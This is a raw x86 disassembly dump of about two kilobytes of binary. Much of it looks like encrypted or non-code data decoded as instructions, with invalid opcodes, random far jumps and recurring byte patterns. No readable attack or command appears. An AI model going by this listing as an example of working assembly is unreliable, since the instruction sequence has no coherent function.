  40d2c2:	add    BYTE PTR [edx+0x5],ah
  40d2c5:	inc    ebx
  40d2c6:	add    BYTE PTR [eax+0x78],al
  40d2c9:	inc    ecx
  40d2ca:	add    BYTE PTR [eax+0x41],bl
  40d2cd:	bound  esi,QWORD PTR [edx+0x54]
  40d2d0:	ja     0x40d325
  40d2d2:	rol    BYTE PTR [edx+edx*2+0x526262cf],1
  40d2d9:	fs xor al,0x5f
  40d2dc:	stos   DWORD PTR es:[edi],eax
  40d2dd:	pop    eax
  40d2de:	push   ecx
  40d2df:	inc    ebx
  40d2e0:	aam    0x91
  40d2e2:	jp     0x40d28c
  40d2e4:	dec    esp
  40d2e5:	(bad)  
  40d2e6:	retf   0x8440
  40d2e9:	add    ah,cl
  40d2eb:	bound  eax,QWORD PTR ds:0xcc840f41
  40d2f1:	inc    ebx
  40d2f2:	add    BYTE PTR [eax+0x0],al
  40d2f5:	inc    eax
  40d2f6:	inc    eax
  40d2f7:	inc    eax
  40d2f8:	int3   
  40d2f9:	add    BYTE PTR ds:0x62404341,al
  40d2ff:	pop    eax
  40d300:	add    BYTE PTR [ebx+0x40],al
  40d303:	bound  ecx,QWORD PTR [edi]
  40d305:	inc    eax
  40d306:	fsub   QWORD PTR [esp+edi*2+0x30]
  40d30a:	adc    BYTE PTR [ecx+eax*1-0x4cd59450],al
  40d311:	push   cs
  40d312:	mov    esp,0xae0d00c3
  40d317:	xchg   esi,eax
  40d318:	inc    edi
  40d319:	pop    ss
  40d31a:	inc    ecx
  40d31b:	mov    edi,0xd9bdcb64
  40d320:	push   ebp
  40d321:	sbb    DWORD PTR [edi+edi*4+0x6fdc7c10],esi
  40d328:	push   edi
  40d329:	inc    ecx
  40d32a:	add    al,0x87
  40d32c:	pop    eax
  40d32d:	inc    ebx
  40d32e:	jmp    0x8c9e:0x667fb7c3
  40d335:	and    eax,0x4000002f
  40d33a:	inc    eax
  40d33b:	cmovno eax,DWORD PTR ds:0x40056243
  40d342:	int3   
  40d343:	add    ah,cl
  40d345:	inc    eax
  40d346:	inc    eax
  40d347:	bound  eax,QWORD PTR [ecx+0x0]
  40d34a:	add    BYTE PTR [edi],cl
  40d34c:	inc    ebx
  40d34d:	inc    eax
  40d34e:	inc    eax
  40d34f:	add    BYTE PTR [ecx+0x43],al
  40d352:	add    eax,0x40256240
  40d357:	bound  eax,QWORD PTR [eax]
  40d359:	sub    edi,DWORD PTR [edi]
  40d35b:	or     ebx,ebx
  40d35d:	test   al,0xbe
  40d35f:	adc    bl,bl
  40d361:	aas    
  40d362:	adc    eax,0x6312a81f
  40d367:	arpl   WORD PTR [ecx+ebp*2],sp
  40d36a:	xchg   ebx,eax
  40d36b:	xchg   edi,eax
  40d36c:	adc    al,al
  40d36e:	push   esp
  40d36f:	mov    eax,0x9466843
  40d374:	mov    eax,0x33008815
  40d379:	outs   dx,DWORD PTR ds:[esi]
  40d37a:	icebp  
  40d37b:	pop    ds
  40d37c:	inc    ecx
  40d37d:	int    0x6c
  40d37f:	shr    DWORD PTR [eax-0x333ed1f],0x11
  40d386:	pop    edi
  40d387:	cli    
  40d388:	inc    eax
  40d389:	fnstenv [ebp+0x7f]
  40d38c:	sub    BYTE PTR [esp+eax*4-0x33fffa18],bh
  40d393:	inc    eax
  40d394:	inc    ecx
  40d395:	inc    eax
  40d396:	inc    ebx
  40d397:	bound  esp,QWORD PTR ds:0x41400043
  40d39d:	add    BYTE PTR [eax],al
  40d39f:	add    eax,0x43624062
  40d3a4:	inc    ecx
  40d3a5:	inc    eax
  40d3a6:	inc    eax
  40d3a7:	inc    eax
  40d3a8:	add    eax,0x40624340
  40d3ad:	add    eax,0x40664140
  40d3b2:	xor    ecx,eax
  40d3b4:	push   esi
  40d3b5:	xor    esp,DWORD PTR [edi+0xd]
  40d3b8:	and    DWORD PTR [ebx+0x6c],0xffffff87
  40d3bc:	xchg   ecx,eax
  40d3bd:	pop    ds
  40d3be:	push   ebx
  40d3bf:	int    0x93
  40d3c1:	leave  
  40d3c2:	pop    edx
  40d3c3:	mov    cl,BYTE PTR ds:0x77402749
  40d3c9:	cld    
  40d3ca:	inc    ebx
  40d3cb:	es adc eax,0x5a2a3db7
  40d3d1:	stc    
  40d3d2:	shl    DWORD PTR [eax+edx*2+0x2d],1
  40d3d6:	retf   
  40d3d7:	push   esp
  40d3d8:	bound  esp,QWORD PTR [edx+0x3e]
  40d3db:	scas   al,BYTE PTR es:[edi]
  40d3dc:	inc    ebx
  40d3dd:	add    BYTE PTR ds:0x41107840,al
  40d3e3:	bound  eax,QWORD PTR [eax+0x40]
  40d3e6:	sldt   WORD PTR [eax-0x34]
  40d3ea:	js     0x40d44e
  40d3ec:	add    eax,0x40664143
  40d3f1:	inc    ebx
  40d3f2:	add    BYTE PTR [ecx+0x5],al
  40d3f5:	js     0x40d437
  40d3f7:	bound  eax,QWORD PTR [eax+0x0]
  40d3fa:	inc    eax
  40d3fb:	rcr    ecx,1
  40d3fd:	xor    BYTE PTR [esi],0x8f
  40d400:	add    BYTE PTR [edx-0x5c],ah
  40d403:	ins    DWORD PTR es:[edi],dx
  40d404:	cmp    BYTE PTR [ebx+0x45],ah
  40d407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d408:	shr    BYTE PTR [edx-0x6],0xf1
  40d40c:	inc    edx
  40d40e:	inc    eax
  40d40f:	push   ebp
  40d410:	pop    ss
  40d411:	inc    ecx
  40d412:	inc    ebx
  40d413:	inc    eax
  40d414:	inc    eax
  40d415:	add    eax,0x434162
  40d41a:	inc    eax
  40d41b:	add    BYTE PTR [edx+0x5],ah
  40d41e:	inc    eax
  40d41f:	adc    BYTE PTR [edx+0x40],ah
  40d422:	inc    ebx
  40d423:	inc    ecx
  40d424:	add    eax,0x4340
  40d429:	add    eax,0x404162
  40d42e:	add    BYTE PTR [eax+0x43],al
  40d431:	inc    eax
  40d432:	add    eax,0x5244ac74
  40d437:	lds    eax,FWORD PTR [eax-0x79]
  40d43a:	xor    al,0x41
  40d43c:	sub    eax,0x40e53f71
  40d441:	bound  eax,QWORD PTR [bp+di+0x19]
  40d445:	mov    edi,0x29e46a47
  40d44a:	(bad)  
  40d44b:	xor    BYTE PTR [eax+ecx*2-0x8],ah
  40d44f:	adc    al,bh
  40d451:	bound  esp,QWORD PTR [ebp-0x5c]
  40d454:	inc    eax
  40d455:	add    BYTE PTR [eax],al
  40d457:	inc    ecx
  40d458:	inc    ebx
  40d459:	add    eax,0x41784062
  40d45e:	inc    eax
  40d45f:	inc    eax
  40d460:	add    BYTE PTR [edi],cl
  40d462:	bound  eax,QWORD PTR [ebx+0x0]
  40d465:	add    eax,0x25006240
  40d46a:	inc    eax
  40d46b:	add    eax,0x40254143
  40d470:	add    eax,0x7620000
  40d475:	jb     0x40d436
  40d477:	mov    eax,0x405941c3
  40d47c:	mov    ds:0xbfc106a1,eax
  40d481:	xchg   esp,ebx
  40d483:	xor    edi,edx
  40d485:	push   ebp
  40d486:	dec    eax
  40d487:	sub    bh,BYTE PTR [edi-0x1e93f3a4]
  40d48d:	xchg   ecx,eax
  40d48e:	mov    al,0x62
  40d490:	popf   
  40d491:	or     eax,0x350a7703
  40d496:	je     0x40d514
  40d498:	push   ss
  40d499:	retf   
  40d49a:	add    BYTE PTR [ebx+0x2f],al
  40d49d:	test   BYTE PTR [eax+0x14],0xa8
  40d4a1:	dec    ecx
  40d4a2:	ret    0x43d1
  40d4a5:	add    BYTE PTR [eax],al
  40d4a7:	add    BYTE PTR [ecx+0x40],al
  40d4aa:	bound  esp,QWORD PTR [esi+0x0]
  40d4ad:	inc    eax
  40d4ae:	add    eax,0x5400000
  40d4b3:	inc    ecx
  40d4b4:	inc    eax
  40d4b5:	inc    eax
  40d4b6:	bound  esp,QWORD PTR ds:0x25050043
  40d4bc:	inc    ecx
  40d4bd:	inc    ebx
  40d4be:	inc    eax
  40d4bf:	test   BYTE PTR [eax+0x0],al
  40d4c2:	bound  ebx,QWORD PTR [eax+0x62]
  40d4c5:	inc    ecx
  40d4c6:	inc    eax
  40d4c7:	xchg   ebx,eax
  40d4c8:	daa    
  40d4c9:	push   ecx
  40d4ca:	xor    eax,0x992c3540
  40d4cf:	push   esp
  40d4d0:	push   cs
  40d4d1:	dec    eax
  40d4d2:	loop   0x40d486
  40d4d4:	inc    ecx
  40d4d5:	inc    ebx
  40d4d6:	jbe    0x40d506
  40d4d8:	adc    DWORD PTR [edi-0x424ffa8c],edi
  40d4de:	inc    ebx
  40d4df:	add    edx,DWORD PTR [esi+0x2]
  40d4e2:	arpl   WORD PTR [esi-0x187798c3],ax
  40d4e8:	push   ecx
  40d4e9:	mov    cl,0xff
  40d4eb:	adc    BYTE PTR [edx+0x40],ah
  40d4ee:	inc    ecx
  40d4ef:	and    eax,0x40000500
  40d4f4:	inc    ebx
  40d4f5:	add    eax,0x40624041
  40d4fa:	inc    ebx
  40d4fb:	add    eax,0x43402541
  40d500:	bound  eax,QWORD PTR [eax+0x43]
  40d503:	int3   
  40d504:	inc    eax
  40d505:	bound  eax,QWORD PTR [eax]
  40d507:	inc    ecx
  40d508:	inc    eax
  40d509:	inc    eax
  40d50a:	add    eax,0xb4c36905
  40d50f:	inc    ecx
  40d510:	dec    esp
  40d511:	or     ecx,DWORD PTR [edi]
  40d513:	test   al,0xb1
  40d515:	dec    edi
  40d516:	add    al,0x43
  40d518:	sub    al,0xb5
  40d51a:	jae    0x40d58f
  40d51c:	add    eax,0xf1303d34
  40d521:	test   DWORD PTR [ebx],0x624086c2
  40d527:	mov    al,ds:0x643f6485
  40d52c:	jb     0x40d58a
  40d52e:	dec    edi
  40d52f:	inc    eax
  40d530:	dec    esp
  40d531:	xchg   ecx,eax
  40d532:	pop    ds
  40d533:	in     eax,0xb0
  40d535:	dec    esp
  40d536:	fdiv   QWORD PTR [ecx]
  40d538:	bound  eax,QWORD PTR [ebx]
  40d53a:	bound  eax,QWORD PTR [eax+0x25]
  40d53d:	add    BYTE PTR [esi+0x40],ah
  40d540:	add    eax,0x40404143
  40d545:	inc    ebx
  40d546:	add    BYTE PTR [eax],al
  40d548:	add    BYTE PTR [edx-0x34],ah
  40d54b:	inc    eax
  40d54c:	add    eax,0x40004041
  40d551:	inc    ecx
  40d552:	int3   
  40d553:	add    BYTE PTR [ebx-0x7c],al
  40d556:	add    eax,0x5406240
  40d55b:	bound  esp,QWORD PTR [edx+0x38]
  40d55e:	add    eax,0xa46c42b6
  40d563:	xor    edx,DWORD PTR [ecx+0x62]
  40d566:	xchg   BYTE PTR [esp+eax*2],al
  40d569:	adc    al,0xd
  40d56b:	jbe    0x40d5dc
  40d56d:	inc    ebp
  40d56e:	outs   dx,BYTE PTR ds:[esi]
  40d56f:	bound  ebp,QWORD PTR [edi+eax*2+0x62]
  40d573:	xchg   ebx,eax
  40d574:	mov    bl,0xac
  40d576:	scas   eax,DWORD PTR es:[edi]
  40d577:	mov    ah,0xee
  40d579:	lds    eax,FWORD PTR [eax+0xd]
  40d57c:	push   0x602c056c
  40d581:	sti    
  40d582:	std    
  40d583:	repz push ebx
  40d585:	sub    al,0x86
  40d587:	adc    eax,0x194239d5
  40d58c:	inc    edi
  40d58d:	or     BYTE PTR [ebp+0x62],dh
  40d590:	inc    edx
  40d591:	mov    esi,esp
  40d593:	inc    eax
  40d594:	bound  ebx,QWORD PTR [eax+0x41]
  40d597:	add    eax,0x40404340
  40d59c:	inc    ebx
  40d59d:	inc    eax
  40d59e:	test   BYTE PTR [eax],al
  40d5a0:	add    eax,0x40624041
  40d5a5:	inc    eax
  40d5a6:	add    BYTE PTR [edx+0x5],ah
  40d5a9:	inc    ebx
  40d5aa:	add    BYTE PTR [eax+0x78],al
  40d5ad:	inc    ecx
  40d5ae:	add    BYTE PTR [eax+0x41],bl
  40d5b1:	bound  edx,QWORD PTR [ebx-0x3451668f]
  40d5b7:	inc    esp
  40d5b8:	sbb    bl,bh
  40d5ba:	dec    ebx
  40d5bb:	js     0x40d614
  40d5bd:	add    eax,0x83417664
  40d5c2:	pop    ecx
  40d5c3:	mov    cl,0xb3
  40d5c5:	xchg   BYTE PTR ds:0x407543f7,dh
  40d5cb:	test   BYTE PTR [eax],al
  40d5cd:	int3   
  40d5ce:	bound  eax,QWORD PTR ds:0xcc840f41
  40d5d4:	inc    ebx
  40d5d5:	add    BYTE PTR [eax+0x0],al
  40d5d8:	inc    eax
  40d5d9:	inc    eax
  40d5da:	inc    eax
  40d5db:	int3   
  40d5dc:	add    BYTE PTR ds:0x62404341,al
  40d5e2:	pop    eax
  40d5e3:	add    BYTE PTR [ebx+0x40],al
  40d5e6:	bound  ecx,QWORD PTR [edi]
  40d5e8:	inc    eax
  40d5e9:	or     eax,0x760a870
  40d5ee:	dec    edi
  40d5ef:	xor    dh,bl
  40d5f1:	cmp    cl,bh
  40d5f3:	dec    eax
  40d5f4:	lods   eax,DWORD PTR ds:[esi]
  40d5f5:	das    
  40d5f6:	inc    esp
  40d5f7:	pushf  
  40d5f8:	bound  ebp,QWORD PTR [ecx+0x62055249]
  40d5fe:	pop    ebp
  40d5ff:	inc    eax
  40d600:	mov    ebx,0x8669b1be
  40d605:	cmp    eax,0x2c1f319f
  40d60a:	fiadd  WORD PTR [ecx+0x6c538414]
  40d610:	aas    
  40d611:	jno    0x40d668
  40d613:	mov    esp,0x31a162ac
  40d618:	leave  
  40d619:	dec    ebx
  40d61a:	mov    edi,0x4000005d
  40d61f:	inc    eax
  40d620:	cmovno eax,DWORD PTR ds:0x40056243
  40d627:	int3   
  40d628:	add    ah,cl
  40d62a:	inc    eax
  40d62b:	inc    eax
  40d62c:	bound  eax,QWORD PTR [ecx+0x0]
  40d62f:	add    BYTE PTR [edi],cl
  40d631:	inc    ebx
  40d632:	inc    eax
  40d633:	inc    eax
  40d634:	add    BYTE PTR [ecx+0x43],al
  40d637:	add    eax,0x40256240
  40d63c:	bound  eax,QWORD PTR [eax]
  40d63e:	add    eax,0xac4ea84b
  40d643:	jae    0x40d6b3
  40d645:	fadd   QWORD PTR [esi-0x2712ed3c]
  40d64b:	pop    esp
  40d64c:	jae    0x40d5ed
  40d64e:	push   cs
  40d64f:	ins    BYTE PTR es:[edi],dx
  40d650:	mov    esi,0x66b5ebbe
  40d655:	sub    BYTE PTR [ebx+0x7e3315a8],0x4c
  40d65c:	fldenv [edi+0x5]
  40d65f:	and    edi,esi
  40d661:	cmc    
  40d662:	push   esi
  40d663:	add    eax,0x4140cc00
  40d668:	inc    eax
  40d669:	inc    ebx
  40d66a:	bound  esp,QWORD PTR ds:0x41400043
  40d670:	add    BYTE PTR [eax],al
  40d672:	add    eax,0x43624062
  40d677:	inc    ecx
  40d678:	inc    eax
  40d679:	inc    eax
  40d67a:	inc    eax
  40d67b:	add    eax,0x40624340
  40d680:	add    eax,0x40664140
  40d685:	xor    ah,BYTE PTR [esi+0x1]
  40d688:	xchg   BYTE PTR [esi],ah
  40d68a:	inc    ebx
  40d68b:	inc    ebx
  40d68c:	xlat   BYTE PTR ds:[ebx]
  40d68d:	outs   dx,BYTE PTR ds:[esi]
  40d68e:	fild   QWORD PTR [eax+eiz*2-0x29ccafee]
  40d695:	dec    eax
  40d696:	and    eax,0x8454aa50
  40d69b:	cwde   
  40d69c:	sbb    eax,0x5c3b250
  40d6a1:	adc    eax,0x2de340be
  40d6a6:	pop    es
  40d6a7:	jg     0x40d62f
  40d6a9:	retf   
  40d6aa:	or     eax,0x3459531
  40d6af:	bound  esi,QWORD PTR [ebx]
  40d6b1:	adc    ecx,ecx
  40d6b3:	ins    BYTE PTR es:[edi],dx
  40d6b4:	dec    esi
  40d6b5:	repnz adc DWORD PTR [ebx-0x57],eax
  40d6b9:	mov    WORD PTR [esi],fs
  40d6bb:	into   
  40d6bc:	(bad)  
  40d6bd:	mov    ch,0x40
  40d6bf:	rol    BYTE PTR ds:0x500430d,1
  40d6c5:	inc    eax
  40d6c6:	js     0x40d6d8
  40d6c8:	inc    ecx
  40d6c9:	bound  eax,QWORD PTR [eax+0x40]
  40d6cc:	sldt   WORD PTR [eax-0x34]
  40d6d0:	js     0x40d734
  40d6d2:	add    eax,0x40664143
  40d6d7:	inc    ebx
  40d6d8:	add    BYTE PTR [ecx+0x5],al
  40d6db:	js     0x40d71d
  40d6dd:	bound  eax,QWORD PTR [eax+0x0]
  40d6e0:	inc    eax
  40d6e1:	dec    eax
  40d6e2:	inc    ebx
  40d6e3:	jnp    0x40d753
  40d6e5:	push   ecx
  40d6e6:	push   0xffffff86
  40d6e8:	int    0xcb
  40d6ea:	rol    DWORD PTR [edi+0x45],1
  40d6ed:	dec    ecx
  40d6ee:	pop    esi
  40d6ef:	aaa    
  40d6f0:	inc    eax
  40d6f1:	es jb  0x40d762
  40d6f4:	fild   WORD PTR [eax+0xdb446a8]
  40d6fb:	jnp    0x40d73f
  40d6fd:	mov    bh,0x2
  40d6ff:	add    eax,0xaada0565
  40d704:	inc    ecx
  40d705:	inc    ebx
  40d706:	inc    eax
  40d707:	inc    eax
  40d708:	add    eax,0x434162
  40d70d:	inc    eax
  40d70e:	add    BYTE PTR [edx+0x5],ah
  40d711:	inc    eax
  40d712:	adc    BYTE PTR [edx+0x40],ah
  40d715:	inc    ebx
  40d716:	inc    ecx
  40d717:	add    eax,0x4340
  40d71c:	add    eax,0x404162
  40d721:	add    BYTE PTR [eax+0x43],al
  40d724:	inc    eax
  40d725:	add    eax,0x868101b3
  40d72a:	enter  0x69cb,0x32
  40d72e:	inc    ecx
  40d72f:	shr    BYTE PTR [ebp+0x2f],cl
  40d732:	outs   dx,BYTE PTR ds:[esi]
  40d733:	jge    0x40d776
  40d735:	mov    edx,DWORD PTR [eax+0x27]
  40d738:	fisub  WORD PTR [edi+0x72434878]
  40d73e:	xor    esp,DWORD PTR [edi-0x6f]
  40d741:	add    eax,0x6304153
  40d746:	inc    ecx
  40d747:	repz aam 0x86
  40d74a:	outs   dx,BYTE PTR ds:[esi]
  40d74b:	mov    esp,0x413ba894
  40d750:	push   cs
  40d751:	and    al,0xf8
  40d753:	js     0x40d795
  40d755:	pop    edx
  40d756:	inc    eax
  40d757:	add    BYTE PTR [eax],al
  40d759:	inc    ecx
  40d75a:	inc    ebx
  40d75b:	add    eax,0x41784062
  40d760:	inc    eax
  40d761:	inc    eax
  40d762:	add    BYTE PTR [edi],cl
  40d764:	bound  eax,QWORD PTR [ebx+0x0]
  40d767:	add    eax,0x25006240
  40d76c:	inc    eax
  40d76d:	add    eax,0x40254143
  40d772:	add    eax,0x42620000
  40d777:	xor    DWORD PTR [esi+eiz*4],ebx
  40d77a:	sbb    BYTE PTR fs:[ecx],dh
  40d77d:	test   eax,0x5542a10
  40d782:	push   0x27e86c4f
  40d787:	xor    ebx,ebx
  40d789:	xchg   BYTE PTR [eax+0x43ebdd],dl
  40d78f:	add    BYTE PTR [eax],al
  40d791:	inc    ecx
  40d792:	inc    eax
  40d793:	bound  esp,QWORD PTR [esi+0x0]
  40d796:	inc    eax
  40d797:	add    eax,0x5400000
  40d79c:	inc    ecx
  40d79d:	inc    eax
  40d79e:	inc    eax
  40d79f:	bound  esp,QWORD PTR ds:0x25050043
  40d7a5:	inc    ecx
  40d7a6:	inc    ebx
  40d7a7:	inc    eax
  40d7a8:	test   BYTE PTR [eax+0x0],al
  40d7ab:	bound  ebx,QWORD PTR [eax+0x62]
  40d7ae:	inc    ecx
  40d7af:	inc    eax
  40d7b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7b1:	ss pop ebx
  40d7b3:	mov    al,ds:0x431e542e
  40d7b8:	cmp    eax,DWORD PTR [ecx+0x31]
  40d7bb:	bound  esp,QWORD PTR [ebp-0x7a2ebe7c]
  40d7c1:	jno    0x40d803
  40d7c3:	xchg   ecx,eax
  40d7c4:	add    eax,0x5e8bbd46
  40d7c9:	sub    BYTE PTR [eax-0x7b],dh
  40d7cc:	xchg   BYTE PTR [eax+0x6b],dl
  40d7cf:	mov    dl,0x1a
  40d7d1:	push   ecx
  40d7d2:	xor    al,0xd5
  40d7d4:	sub    DWORD PTR ds:0x4e8b505f,edx
  40d7da:	inc    BYTE PTR [edx-0x5c]
  40d7dd:	leave  
  40d7de:	cld    
  40d7df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7e0:	bound  edx,QWORD PTR [edx-0x5bfa2f9b]
  40d7e6:	pusha  
  40d7e7:	inc    ecx
  40d7e8:	pop    es
  40d7e9:	sub    dl,BYTE PTR [edx+0x62108641]
  40d7ef:	inc    eax
  40d7f0:	inc    ecx
  40d7f1:	and    eax,0x40000500
  40d7f6:	inc    ebx
  40d7f7:	add    eax,0x40624041
  40d7fc:	inc    ebx
  40d7fd:	add    eax,0x43402541
  40d802:	bound  eax,QWORD PTR [eax+0x43]
  40d805:	int3   
  40d806:	inc    eax
  40d807:	bound  eax,QWORD PTR [eax]
  40d809:	inc    ecx
  40d80a:	inc    eax
  40d80b:	inc    eax
  40d80c:	add    eax,0x43201505
  40d811:	jg     0x40d815
  40d813:	or     DWORD PTR [edx+0x17],eax
  40d816:	inc    ecx
  40d817:	jl     0x40d849
  40d819:	loop   0x40d88e
  40d81b:	imul   edx,ecx,0x90ac54a3
  40d821:	rol    DWORD PTR [edx-0x29],1
  40d824:	jecxz  0x40d82b
  40d826:	test   BYTE PTR [eax+eax*2+0x6a],ah
  40d82a:	mov    ah,0x1c
  40d82c:	xor    al,0x86
  40d82e:	dec    esp
  40d82f:	pusha  
  40d830:	bound  eax,QWORD PTR [eax+0x25]
  40d833:	add    BYTE PTR [esi+0x40],ah
  40d836:	add    eax,0x40404143
  40d83b:	inc    ebx
  40d83c:	add    BYTE PTR [eax],al
  40d83e:	add    BYTE PTR [edx-0x34],ah
  40d841:	inc    eax
  40d842:	add    eax,0x40004041
  40d847:	inc    ecx
  40d848:	int3   
  40d849:	add    BYTE PTR [ebx-0x7c],al
  40d84c:	add    eax,0x5406240
  40d851:	bound  esi,QWORD PTR [ecx]
  40d853:	mov    ds:0x6091366e,al
  40d858:	push   eax
  40d859:	in     al,dx
  40d85a:	ins    BYTE PTR es:[edi],dx
  40d85b:	push   es
  40d85c:	inc    eax
  40d85d:	inc    ebx
  40d85e:	jge    0x40d802
  40d860:	xchg   eax,esi
  40d862:	mov    BYTE PTR [edx],bh
  40d864:	push   edx
  40d865:	pop    ds
  40d866:	rol    DWORD PTR ds:0xa1434491,1
  40d86c:	lods   eax,DWORD PTR ds:[esi]
  40d86d:	aaa    
  40d86e:	arpl   WORD PTR [esi+0x41d14d16],ax
  40d874:	aaa    
  40d875:	shl    DWORD PTR [eax+0x7b],1
  40d878:	mov    ch,BYTE PTR [ecx-0x23]
  40d87b:	mov    dl,0x40
  40d87d:	xlat   BYTE PTR ds:[ebx]
  40d87e:	cwde   
  40d87f:	mov    eax,ds:0x28753563
  40d884:	push   eax
  40d885:	inc    esi
  40d886:	bound  eax,QWORD PTR ds:0x58624017
  40d88c:	inc    ecx
  40d88d:	add    eax,0x40404340
  40d892:	inc    ebx
  40d893:	inc    eax
  40d894:	test   BYTE PTR [eax],al
  40d896:	add    eax,0x40624041
  40d89b:	inc    eax
  40d89c:	add    BYTE PTR [edx+0x5],ah
  40d89f:	inc    ebx
  40d8a0:	add    BYTE PTR [eax+0x78],al
  40d8a3:	inc    ecx
  40d8a4:	add    BYTE PTR [eax+0x41],bl
  40d8a7:	bound  esp,QWORD PTR [eax-0x47]
  40d8aa:	xchg   esi,eax
  40d8ab:	outs   dx,DWORD PTR ds:[esi]
  40d8ac:	pop    edx
  40d8ad:	mov    dh,0x86
  40d8af:	clc    
  40d8b0:	in     eax,dx
  40d8b1:	arpl   WORD PTR [ecx],si
  40d8b3:	inc    eax
  40d8b4:	sti    
  40d8b5:	push   esi
  40d8b6:	jo     0x40d91a
  40d8b8:	je     0x40d8fb
  40d8ba:	ja     0x40d8ac
  40d8bc:	add    ah,BYTE PTR [edi]
  40d8be:	mov    al,ds:0x6b434437
  40d8c3:	xor    bh,dl
  40d8c5:	fiadd  DWORD PTR ds:0x3f304dc6
  40d8cb:	inc    eax
  40d8cc:	xchg   ebp,eax
  40d8cd:	lea    eax,[esi+0x5a8c67a8]
  40d8d3:	push   eax
  40d8d4:	inc    eax
  40d8d5:	test   BYTE PTR [eax],al
  40d8d7:	int3   
  40d8d8:	bound  eax,QWORD PTR ds:0xcc840f41
  40d8de:	inc    ebx
  40d8df:	add    BYTE PTR [eax+0x0],al
  40d8e2:	inc    eax
  40d8e3:	inc    eax
  40d8e4:	inc    eax
  40d8e5:	int3   
  40d8e6:	add    BYTE PTR ds:0x62404341,al
  40d8ec:	pop    eax
  40d8ed:	add    BYTE PTR [ebx+0x40],al
  40d8f0:	bound  ecx,QWORD PTR [edi]
  40d8f2:	inc    eax
  40d8f3:	pop    ebp
  40d8f4:	shr    BYTE PTR [esi+0x10],0x80
  40d8f8:	inc    esp
  40d8f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8fa:	xor    al,0x73
  40d8fc:	bound  ebx,QWORD PTR [edi-0x6dae015c]
  40d902:	adc    dl,al
  40d904:	jns    0x40d90b
  40d906:	add    eax,0xf2006b4f
  40d90b:	mov    bh,0x34
  40d90d:	xchg   ch,cl
  40d90f:	scas   ax,WORD PTR es:[edi]
  40d911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d912:	adc    eax,0x44771f4a
  40d917:	ret    
  40d918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d919:	pop    ebx
  40d91a:	jp     0x40d8d0
  40d91c:	push   es
  40d91d:	sahf   
  40d91e:	ins    BYTE PTR es:[edi],dx
  40d91f:	pop    ss
  40d920:	inc    ebx
  40d921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d922:	push   ss
  40d923:	adc    esp,DWORD PTR [ebx+0x5]
  40d926:	cmp    BYTE PTR [eax],al
  40d928:	add    BYTE PTR [eax+0x40],al
  40d92b:	cmovno eax,DWORD PTR ds:0x40056243
  40d932:	int3   
  40d933:	add    ah,cl
  40d935:	inc    eax
  40d936:	inc    eax
  40d937:	bound  eax,QWORD PTR [ecx+0x0]
  40d93a:	add    BYTE PTR [edi],cl
  40d93c:	inc    ebx
  40d93d:	inc    eax
  40d93e:	inc    eax
  40d93f:	add    BYTE PTR [ecx+0x43],al
  40d942:	add    eax,0x40256240
  40d947:	bound  eax,QWORD PTR [eax]
  40d949:	jae    0x40d91d
  40d94b:	icebp  
  40d94c:	xchg   esp,eax
  40d94d:	add    eax,0xa8bd86ce
  40d952:	xchg   edx,eax
  40d953:	push   ebx
  40d954:	aaa    
  40d955:	xor    DWORD PTR [eax-0x38ed67a0],esi
  40d95b:	jecxz  0x40d9dc
  40d95d:	inc    eax
  40d95e:	bound  ebx,QWORD PTR [ebp+0x1daebf62]
  40d964:	adc    DWORD PTR [ecx+0x4],edx
  40d967:	add    eax,0x866642be
  40d96c:	inc    edi
  40d96d:	cmp    ebx,DWORD PTR [esi+eax*4+0x45417f40]
  40d974:	shr    BYTE PTR [ebp-0x58],1
  40d977:	add    eax,0x4a430063
  40d97c:	ins    DWORD PTR es:[edi],dx
  40d97d:	pop    edi
  40d97e:	add    eax,0x4140cc00
  40d983:	inc    eax
  40d984:	inc    ebx
  40d985:	bound  esp,QWORD PTR ds:0x41400043
  40d98b:	add    BYTE PTR [eax],al
  40d98d:	add    eax,0x43624062
  40d992:	inc    ecx
  40d993:	inc    eax
  40d994:	inc    eax
  40d995:	inc    eax
  40d996:	add    eax,0x40624340
  40d99b:	add    eax,0x40664140
  40d9a0:	mov    dl,0x9c
  40d9a2:	(bad)  [edx+0x30]
  40d9a5:	pop    ebp
  40d9a6:	dec    esi
  40d9a7:	outs   dx,DWORD PTR ds:[esi]
  40d9a8:	inc    ecx
  40d9a9:	add    eax,0xad88aed8
  40d9ae:	rcl    DWORD PTR [edi-0x7eb1799a],1
  40d9b4:	inc    eax
  40d9b5:	or     ebp,DWORD PTR [edx]
  40d9b7:	dec    eax
  40d9b8:	add    BYTE PTR [ecx],cl
  40d9ba:	pop    eax
  40d9bb:	mov    eax,0x9df35931
  40d9c0:	arpl   WORD PTR [ebx-0x2093ca3f],bx
  40d9c6:	sbb    ecx,DWORD PTR [eax-0x50]
  40d9c9:	add    eax,0x8642cb10
  40d9ce:	inc    ebp
  40d9cf:	lahf   
  40d9d0:	add    eax,0x43bf4c86
  40d9d5:	push   DWORD PTR [ecx+0x61136948]
  40d9db:	or     eax,0x40050043
  40d9e0:	js     0x40d9f2
  40d9e2:	inc    ecx
  40d9e3:	bound  eax,QWORD PTR [eax+0x40]
  40d9e6:	sldt   WORD PTR [eax-0x34]
  40d9ea:	js     0x40da4e
  40d9ec:	add    eax,0x40664143
  40d9f1:	inc    ebx
  40d9f2:	add    BYTE PTR [ecx+0x5],al
  40d9f5:	js     0x40da37
  40d9f7:	bound  eax,QWORD PTR [eax+0x0]
  40d9fa:	inc    eax
  40d9fb:	ror    DWORD PTR [ebx],1
  40d9fd:	fs lahf 
  40d9ff:	jp     0x40d99b
  40da01:	loop   0x40d9cb
  40da03:	ins    BYTE PTR es:[edi],dx
  40da04:	add    BYTE PTR [ebp+0x5b055448],dh
  40da0a:	dec    eax
  40da0b:	rcl    ecx,1
  40da0d:	jle    0x40d9ae
  40da0f:	clc    
  40da10:	xchg   bl,cl
  40da12:	retf   0x2bd4
  40da15:	adc    DWORD PTR [eax+0x41],ecx
  40da18:	inc    ebx
  40da19:	inc    eax
  40da1a:	inc    eax
  40da1b:	add    eax,0x434162
  40da20:	inc    eax
  40da21:	add    BYTE PTR [edx+0x5],ah
  40da24:	inc    eax
  40da25:	adc    BYTE PTR [edx+0x40],ah
